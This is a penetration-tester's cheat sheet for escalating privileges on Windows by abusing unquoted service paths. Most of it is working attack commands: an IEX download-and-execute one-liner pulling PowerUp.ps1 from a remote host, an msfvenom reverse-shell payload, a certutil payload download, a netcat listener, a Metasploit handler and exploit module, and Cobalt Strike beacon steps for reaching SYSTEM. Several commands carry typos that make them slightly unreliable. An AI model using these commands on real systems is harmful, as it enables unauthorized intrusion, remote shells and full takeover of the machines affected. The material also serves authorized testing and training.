# Windows Priv Esc- Unqouted Service Paths

```
C:\Program Files\A Folder\vulnerable-application.exe
```

The way windows searches for a program means it will look in this order:

```
C:\Program.exe
c:\Program Files\A.xe
c:\Program Files\A Folder\vulnerable-application.exe
```

So if you can write to any of these locations you could place a malicious binary that is run instead.

## Checking Permissions

Via icacls:

```
icacls "C:\"
icacls "C:\Program Files"
icacl "C:\Program Files\A Folder"
```

Via Powershell:

```
 Get-Acl 'C:\Program Files' | % {$_.access}
```

Check to see if write permissions are given to the user, or a group they are a member of. 



## Finding Unquoted Service Paths

```
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

```
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip/PowerUp.ps1');Get-ServiceUnquoted"
```

https://powersploit.readthedocs.io/en/latest/Privesc/Get-UnquotedService/

IF a path is found you could also run the following to find a path you can write to:

https://powersploit.readthedocs.io/en/latest/Privesc/Get-ModifiablePath/

```
Get-ModifiablePath
```

An alternative is to modify powerup.ps1 to execute powerup automatically. Add whatever command to the bottom of powerup, for example all checks:

```
Invoke-AllChecks
```

then run:

```
echo IEX(New-Object Net.WebClient).DownloadString('http://IP:Port/PowerUp.ps1') | powershell -noprofile
```

## Exploiting with Modified Binary

To quickly create a malicious payload:

```
msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f exe -o name.exe
```

In Cobalt Strike, use TCP beacons bound to localhost for priv esc. The beacon will have svc in the filename when using the CS generate all option. 




### Transfer the file 

You could host the file using SimpleHTTPServer and then use certutil:

```
certutil.exe -urlcache -f http://blah.com/name.exe name.exe
```

You could also use an SMBserver etc 

```
copy \\ip\folder\name.exe .
```

### Listener 

set up a netcat listener

```
nc -nvlp port
```

Use metsploit

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST
set LPORT
exploit -j
```

### Write-ServiceBinary

- Part of PowerUp
- https://powersploit.readthedocs.io/en/latest/Privesc/Write-ServiceBinary/

```
Write-ServiceBinary -Name 'Name of Service' -Command '\\IP\folder\name.exe' -Path 'C:\Program Files\A\name.exe'
```

### Stop/Start Service

- you might need to either wait for the system to restart 
- Or you could try and stop/strart the service if you have privileges

```
sc qc "service name"
sc stop "service name"
```



## Exploiting with Metasploit

- Once you have a meterpreter/other listener

```
use exploit/windows/local/trusted_service_path
set session x
exploit
```

## Exploiting with Cobalt Strike

- Use a TCP beacon bound to localhost as the service binary
- After the service is stopped/restarted verify that there is a tcp listener on localhost using the port configured in CS

```
netstat -anp tcp
```
- Connect to the beacon

```
connect localhost <port>
```

- You should then see the listener running as SYSTEM or whatever privileges you have gained. 
